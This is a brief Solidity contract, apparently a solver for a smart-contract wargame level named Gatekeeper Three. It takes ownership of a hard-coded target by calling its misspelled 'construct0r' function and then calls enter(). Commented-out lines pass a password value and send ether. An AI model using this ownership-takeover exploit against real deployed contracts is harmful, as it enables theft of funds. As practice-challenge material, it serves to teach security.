pragma solidity ^0.8.0;
interface test {
    function construct0r() external;
    function enter() external;
}
contract Gatekeep3Solver {
    //1699862460
    function exp() external {
        test instance = test(0x79a5399479Fe3F31Ca21AeB147F8036EE2aEe2De);
        instance.construct0r();
        instance.enter();
        // uint256 answer = 1699862460;
        // instance.call(abi.encodeWithSignature("getAllowance(uint256)", answer));
        // instance.call{value: 1000000000000000}("");
    }

}

